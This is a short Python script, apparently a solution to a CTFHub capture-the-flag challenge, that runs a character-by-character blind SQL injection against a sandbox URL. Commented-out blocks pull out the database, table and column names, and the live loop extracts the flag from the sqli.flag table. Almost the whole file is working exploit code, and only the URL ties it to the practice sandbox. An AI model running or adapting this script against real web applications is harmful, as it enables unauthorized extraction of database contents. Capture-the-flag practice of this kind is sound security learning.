#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import requests
import sys
session=requests.session()
url = "http://challenge-2d36497ea5cb2b8c.sandbox.ctfhub.com:10080/?id="
name = ""

# for k in range(1,10):
#     for i in range(1,10):
#         print(i)
#         for j in range(31,128):
#             j = (128+31) -j
#             str_ascii=chr(j)
#             #数据库名
#             #payolad = "if(substr(database(),%s,1) = '%s',1,(select table_name from information_schema.tables))"%(str(i),str(str_ascii))
#             #表名
#             #payolad = "if(substr((select table_name from information_schema.tables where table_schema='sqli' limit %d,1),%d,1) = '%s',1,(select table_name from information_schema.tables))" %(k,i,str(str_ascii))
#             #字段名
#             payolad = "if(substr((select column_name from information_schema.columns where table_name='flag' and table_schema='sqli'),%d,1) = '%s',1,(select table_name from information_schema.tables))" %(i,str(str_ascii))
#             str_get = session.get(url=url + payolad).text
#             if "query_success" in str_get:
#                 if str_ascii=="+":
#                    sys.exit()
#                 else:
#                     name+=str_ascii
#                     break
#         print(name)

#查询字段内容
for i in range(1,50):
    print(i)
    for j in range(31,128):
        j = (128+31) -j
        str_ascii=chr(j)
        payolad = "if(substr((select flag from sqli.flag),%d,1) = '%s',1,(select table_name from information_schema.tables))" %(i,str_ascii)
        str_get = session.get(url=url + payolad).text
        if "query_success" in str_get:
            if str_ascii == "+":
                sys.exit()
            else:
                name += str_ascii
                break
    print(name)
